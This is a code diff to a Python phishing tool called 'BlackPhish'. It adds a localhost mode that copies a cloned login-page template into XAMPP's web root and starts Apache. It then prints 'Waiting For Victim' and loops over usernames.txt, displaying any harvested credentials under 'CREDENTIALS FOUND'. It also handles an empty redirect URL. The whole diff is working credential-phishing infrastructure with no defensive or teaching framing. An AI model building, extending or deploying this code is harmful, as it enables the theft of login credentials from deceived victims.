@@ -150,6 +150,7 @@ def setup(template):  # Template for input #
 
     print('\n')
     print(red + '           [1]' + blue + ' ngrok (More Options for windows Soon!)\n\n')
+    print(red + '           [2]' + blue + ' localhost \n')
     choice1 = input(red + "        [" + blue + f"BlackPhish-{template}" + red + "] -> ")
 
 
@@ -168,7 +169,7 @@ def setup(template):  # Template for input #
         system("cls")
         #system('del /f C:\\xampp\\htdocs\\*')
 
-        print(green + '[+] Copying Files')
+        print(green + f'[+] Copying Files from {template}')
         sleep(0.1)
         dir_util.copy_tree(f"Websites/{template}",
                            "C:\\xampp\\htdocs\\")  # Copies the entire folder of Websites/template to htdocs for xampp#
@@ -200,6 +201,47 @@ def setup(template):  # Template for input #
                     system("type C:\\xampp\\htdocs\\usernames.txt")
                     print("\n______________________________________________________________________________" + reset)
                     endMessage()
+    if choice1 == '2':
+        system("cls")
+        # system('del /f C:\\xampp\\htdocs\\*')
+
+        print(green + f'[+] Copying Files from {template} template')
+        sleep(0.1)
+        dir_util.copy_tree(f"Websites/{template}",
+                           "C:\\xampp\\htdocs\\")  # Copies the entire folder of Websites/template to htdocs for xampp#
+        redirect()  # Redirect Prompt #
+        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
+        dir_util.copy_tree("Server/www", "C:\\xampp\\htdocs\\")  # Copies from Server/www to C:\\xampp\\htdocs\\ #
+
+        print(green + '[+] Copying to C:\\xampp\\htdocs\\')
+        sleep(0.1)
+        print(yellow + '[+] Starting Apache2 Service')
+        sleep(0.1)
+        system(f'{cwd}\\Windows\\apachestart.bat')  # Starts apache service #
+        print(green + '[+] Apache2 Service Started')
+        print(green + f"[+] {template} template is currently running!")
+        sleep(0.1)
+        sleep(4)
+        system('cls')
+
+        print(green + "[+] Localhost: " + red + localip + "\n")  # Shows where site is hosted locally #
+        sleep(0.1)
+        print(yellow + "[+] Waiting For Victim ... \n")
+        sleep(0.1)
+        while True:  # Waits for content on usernames.txt #
+            with open('C:\\xampp\\htdocs\\usernames.txt') as creds:
+                lines = creds.read().rstrip()
+
+                if len(lines) != 0:
+                    sleep(5)
+                    system('cls')
+                    print(blue + "\nLocalhost: " + red + localip + "\n")
+                    print(green + "______________________________________________________________________________\n")
+                    print('\n                   CREDENTIALS FOUND\n\n')
+                    system("type C:\\xampp\\htdocs\\usernames.txt")
+                    print("\n______________________________________________________________________________" + reset)
+                    print(yellow + "\n  [Control + C] to stop\n")
+                    #endMessage()
 
     else:
         print(red + '[!] Invalid Option')
@@ -224,6 +266,12 @@ def ngrokForward():
 
 def redirect():
     redirect = input(yellow + "URL redirect to: ")
+
+    if redirect == "":
+        print(red+"[!] redirect as been set to none!")
+        pass
+
+
     if 'http://' in redirect or 'https://' in redirect:
         with open('C:\\xampp\\htdocs\\login.php') as f:
             read = f.read()
